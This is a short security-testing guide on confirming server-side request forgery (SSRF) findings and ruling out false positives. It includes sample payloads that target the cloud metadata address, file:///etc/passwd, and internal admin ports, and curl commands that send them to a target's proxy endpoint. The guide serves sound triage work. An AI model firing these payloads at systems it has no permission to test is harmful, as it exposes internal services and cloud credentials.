# SSRF False Positive Validation

## Common False Positives

### 1. DNS Lookup ≠ Full SSRF
```bash
url=http://COLLABORATOR/test
# DNS hit received but NO HTTP request
```
Many apps do DNS resolution (for logging, validation) without actually fetching the URL. DNS-only is not SSRF.

**Must show:** Actual HTTP request from server IP, not just DNS.

### 2. Redirect Following
```bash
POST /api/proxy
{"url": "http://169.254.169.254/"}

# Response: 302 redirect to login page
```
The app might follow redirects to its own authentication, not actually access the metadata endpoint.

**Confirm:** Check if response body contains metadata content, not just a redirect.

### 3. Localhost Returns Different Page
```bash
url=http://127.0.0.1:80
# Returns homepage HTML (same as public)
```
If localhost returns the same content as the public site, there's no SSRF — the app just fetched itself.

**Confirm:** Look for DIFFERENT content on internal ports (8080 admin panel, 9200 Elasticsearch, 6379 Redis).

### 4. Schema Restriction
```bash
file:///etc/passwd → 400 Bad Request
```
The app might block `file://` but allow `http://`. Test multiple protocols.

## Confirmation Criteria

| Signal | Confident? |
|--------|------------|
| HTTP request from server IP to collaborator | ✅ Confirmed |
| Cloud metadata returned in response | ✅ Confirmed |
| Internal service response (Redis, ES, admin) | ✅ Confirmed |
| DNS lookup only | ❌ Inconclusive |
| Same content as public site | ❌ False Positive |

## Validation Flow

### Blind SSRF
```bash
# Step 1: Test with collaborator
curl -X POST "https://target.com/api/proxy" \
  -d '{"url":"http://COLLABORATOR/ssrf-test"}'

# Step 2: Check collaborator for HTTP request
# If only DNS → low confidence
# If HTTP with server User-Agent/IP → confirmed

# Step 3: Confirm server-side execution
# Try to fetch a page that only the server can access
curl -X POST "https://target.com/api/proxy" \
  -d '{"url":"http://127.0.0.1:8080/admin"}'
# Different content from public → confirmed
```
